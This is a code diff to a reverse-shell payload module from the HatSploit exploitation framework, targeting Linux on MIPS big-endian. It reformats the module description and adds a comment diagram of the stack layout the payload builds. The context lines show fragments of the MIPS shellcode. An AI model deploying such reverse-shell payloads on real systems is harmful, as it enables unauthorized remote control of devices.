@@ -22,10 +22,10 @@ class HatSploitPayload(Payload, Handler):
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': (
-                "This payload creates an interactive reverse Pwny shell for Linux "
-                "with MIPS big-endian architecture."
-            ),
+            'Description': """
+                This payload creates an interactive reverse Pwny shell for Linux
+                with MIPS big-endian architecture.
+            """,
             'Arch': ARCH_MIPSBE,
             'Platform': OS_LINUX,
             'Session': PwnySession,
@@ -56,6 +56,32 @@ class HatSploitPayload(Payload, Handler):
                 li   $s3, 0x100
                 li   $v0, 4175
                 syscall
+
+            #################################################
+            ##
+            ##    +----------------------------------+ low
+            ##    |              ARGC                |
+            ##    |----------------------------------|
+            ##    |           ARGV[0] = p            |
+            ##    |----------------------------------|
+            ##    |         ARGV[1] = sock           |
+            ##    |----------------------------------|
+            ##    |         NULL (ends ARGV)         |
+            ##    |----------------------------------|
+            ##    |          ENV strings             |
+            ##    |----------------------------------|
+            ##    |         NULL (ends ENV)          |
+            ##    |----------------------------------|
+            ##    |           AT_BASE (7)            |
+            ##    |----------------------------------|
+            ##    |   address of pwny binary image   |
+            ##    |----------------------------------|
+            ##    |           AT_NULL (0)            |
+            ##    |----------------------------------|
+            ##    |         NULL (ends AUXV)         |
+            ##    +----------------------------------+ high
+            ##
+            #################################################
 
                 and  $sp, $sp, -8
                 li   $t4, 0x70000070
